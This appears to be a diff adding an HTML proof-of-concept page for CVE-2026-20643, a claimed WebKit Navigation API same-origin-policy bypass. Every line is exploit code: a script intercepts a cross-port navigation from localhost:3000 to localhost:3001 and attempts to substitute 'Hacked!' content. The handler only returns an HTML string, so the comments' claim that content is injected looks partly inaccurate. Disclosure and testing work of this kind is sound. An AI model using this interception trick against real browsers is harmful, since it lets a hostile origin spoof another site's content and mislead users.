@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2026-20643 PoC - WebKit Navigation API SOP Bypass</title>
+</head>
+<body>
+    <h1>CVE-2026-20643 PoC</h1>
+    <p>Target: <strong>http://localhost:3001</strong> (Different Origin)</p>
+    
+    <!-- Link to a different port on the same host -->
+    <a id="victimLink" href="http://localhost:3001/sensitive-data">Click to visit Secure Portal</a>
+
+    <div id="log" style="margin-top: 20px; color: red; font-family: monospace;"></div>
+
+    <script>
+        const logDiv = document.getElementById('log');
+
+        // Step 1: Register a listener for the Navigation API 'navigate' event
+        window.navigation.addEventListener('navigate', (event) => {
+            const url = new URL(event.destination.url);
+            
+            // Step 2: Check if the Navigation API allows interception
+            // Vulnerability: canIntercept should be FALSE for different ports, but it's TRUE here.
+            if (event.canIntercept) {
+                logDiv.innerHTML += `[!] VULNERABLE: Intercepting navigation to cross-port origin: ${url.origin}<br>`;
+                
+                // Step 3: Malicious Interception
+                // The attacker "hijacks" the navigation and serves their own content instead
+                event.intercept({
+                    async handler() {
+                        logDiv.innerHTML += `[!] HIJACKED: Browser stayed on port 3000 but thinks it's showing port 3001 content.<br>`;
+                        return "<h1>Hacked!</h1><p>This content was injected by the malicious origin at port 3000.</p>";
+                    }
+                });
+            } else {
+                logDiv.innerHTML += `[+] SECURE: Navigation to ${url.origin} cannot be intercepted.<br>`;
+            }
+        });
+    </script>
+</body>
+</html>
